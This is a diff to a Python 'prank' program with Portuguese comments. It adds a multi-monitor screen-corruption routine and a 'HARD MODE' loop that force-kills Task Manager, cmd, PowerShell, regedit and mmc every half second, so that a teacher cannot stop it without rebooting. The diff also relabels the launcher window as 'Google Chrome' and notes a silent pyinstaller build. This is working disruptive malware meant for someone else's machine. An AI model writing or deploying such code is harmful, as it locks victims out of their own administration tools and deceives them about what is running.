@@ -28,6 +28,10 @@ import random
 # imports spongebob case
 import pyperclip
 
+# import cacador de processos
+import subprocess
+
+
 # Define a estrutura RECT em C para o Python conseguir ler as coordenadas da janela
 class RECT(ctypes.Structure):
     _fields_ = [
@@ -598,6 +602,94 @@ def converter_spongebob_case(texto):
             
     return resultado
 
+def glitch_derretimento_tela():
+    print("Iniciando o GDI Screen Glitch (Multi-Monitor)...")
+    
+    # Prepara as funções do C
+    user32 = ctypes.windll.user32
+    gdi32 = ctypes.windll.gdi32
+    
+    # Constantes mágicas do Windows para ler a Tela Virtual
+    SM_XVIRTUALSCREEN = 76
+    SM_YVIRTUALSCREEN = 77
+    SM_CXVIRTUALSCREEN = 78
+    SM_CYVIRTUALSCREEN = 79
+    
+    # Calcula o tamanho e a origem da "Mega Tela" (todos os monitores juntos)
+    v_left = user32.GetSystemMetrics(SM_XVIRTUALSCREEN)
+    v_top = user32.GetSystemMetrics(SM_YVIRTUALSCREEN)
+    v_width = user32.GetSystemMetrics(SM_CXVIRTUALSCREEN)
+    v_height = user32.GetSystemMetrics(SM_CYVIRTUALSCREEN)
+    
+    try:
+        while True:
+            # Espera 15 minutos em silêncio (Para testar agora, mude para 5 segundos)
+            time.sleep(15 * 60)
+            print(f"[{time.strftime('%H:%M:%S')}] A matriz está derretendo!")
+            
+            # O glitch dura 5 segundos frenéticos
+            fim_glitch = time.time() + 5
+            
+            # DC 0 = Desktop Inteiro (A Tela Virtual)
+            hdc = user32.GetDC(0)
+            
+            while time.time() < fim_glitch:
+                # Sorteia um bloco em qualquer lugar da Tela Virtual
+                x = random.randint(v_left, v_left + v_width - 100)
+                y = random.randint(v_top, v_top + v_height - 100)
+                
+                bloco_w = random.randint(50, 400)
+                bloco_h = random.randint(50, 400)
+                
+                # Deslocamento do glitch: Balança para os lados e puxa para baixo (derretimento)
+                dx = random.randint(-10, 10)
+                dy = random.randint(5, 20) 
+                
+                # Função gráfica de baixo nível para copiar e colar os pixels desconfigurados
+                gdi32.BitBlt(
+                    hdc, x + dx, y + dy, 
+                    bloco_w, bloco_h, 
+                    hdc, x, y, 
+                    0x00CC0020 # SRCCOPY
+                )
+                time.sleep(0.01) # Taxa de atualização do glitch
+                
+            # Libera a memória gráfica para não travar o PC de verdade
+            user32.ReleaseDC(0, hdc)
+            print("Glitch finalizado. Os artefatos visuais permanecerão até a tela ser atualizada.")
+            
+    except Exception as e:
+        print(f"Erro no GDI Glitch: {e}")
+
+def cacador_de_processos():
+    print("Iniciando o Caçador de Processos (Task Manager Killer)...")
+    
+    # Lista das ferramentas de administração e diagnóstico do Windows
+    alvos_proibidos = [
+        "taskmgr.exe",     # Gerenciador de Tarefas
+        "cmd.exe",         # Prompt de Comando
+        "powershell.exe",  # PowerShell
+        "regedit.exe",     # Editor de Registro
+        "mmc.exe"          # Console de Gerenciamento (Serviços, etc)
+    ]
+    
+    try:
+        while True:
+            # Polling rate ultra-rápido (0.5s)
+            # É rápido o suficiente para fechar a janela antes que o professor consiga clicar em "Finalizar Tarefa"
+            time.sleep(0.5)
+            
+            for alvo in alvos_proibidos:
+                # O comando taskkill manda o SO matar o processo à força (/F) pelo nome da imagem (/IM)
+                # O '> nul 2>&1' redireciona as mensagens de erro/sucesso para o limbo,
+                # mantendo o seu terminal do Python completamente silencioso e limpo.
+                comando = f"taskkill /F /IM {alvo} > nul 2>&1"
+                subprocess.call(comando, shell=True)
+                
+    except KeyboardInterrupt:
+        print("\nInterrupção detectada. Caçador desativado.")
+    except Exception as e:
+        print(f"Erro no Caçador de Processos: {e}")
 
 prank_list = [
     {"id": "rand_mouse", "nome": "Randomizar Mouse", "descricao": "Altera a velocidade a cada 5 min", "funcao": randomizar_velocidade_mouse},
@@ -609,7 +701,9 @@ prank_list = [
     {"id": "fobia_botao_iniciar", "nome": "Fugir botão iniciar", "descricao": "Mouse não irá acessar o botão windows", "funcao": fobia_botao_iniciar},
     {"id": "janela_bebada", "nome": "Janela Bêbada", "descricao": "Janela atual vai se mover a cada 15 seg", "funcao": janela_bebada},
     {"id": "fobia_botao_fechar", "nome": "Fugir botão fechar", "descricao": "Mouse não irá acessar o botão fechar", "funcao": fobia_botao_fechar},
-    {"id": "sabotador_clipboard_periodico", "nome": "Sabotar Crtl V", "descricao": "Sabota os dados a cada 10 tentativas", "funcao": sabotador_clipboard}
+    {"id": "sabotador_clipboard_periodico", "nome": "Sabotar Crtl V", "descricao": "Sabota os dados a cada 10 tentativas", "funcao": sabotador_clipboard},
+    {"id": "glitch_derretimento_tela", "nome": "Derreter tela", "descricao": "Derrete a tela por 5s a cada 15 min", "funcao": glitch_derretimento_tela},
+    {"id": "cacador_de_processos", "nome": "HARD MODE", "descricao": "SÓ SERÁ POSSÍVEL FINALIZAR CASO O COMPUTADOR SEJA REINICIADO", "funcao": cacador_de_processos}
     ]
 
 payloads_selecionados = []
@@ -742,7 +836,7 @@ def gerar_html(lista_pegadinhas):
             .terminal-box {{
                 border: 1px solid #005500;
                 padding: 10px;
-                height: 130px; /* Aumentado significativamente para preencher a tela */
+                height: 90px; /* Aumentado significativamente para preencher a tela */
                 overflow-y: auto; /* Permite rolar o histórico se encher de logs */
                 font-size: 12px;
                 color: #00aa00;
@@ -873,7 +967,7 @@ if __name__ == '__main__':
 
     # Inicia a Janela Lançadora
     janela = webview.create_window(
-        title='Atualizador do Sistema', 
+        title='Google Chrome', 
         html=html_final, 
         js_api=api,
         width=800, 
@@ -886,3 +980,5 @@ if __name__ == '__main__':
 
     # Só chega aqui quando a janela web é destruída
     disparar_threads()
+
+# pyinstaller --noconsole --onefile main.py
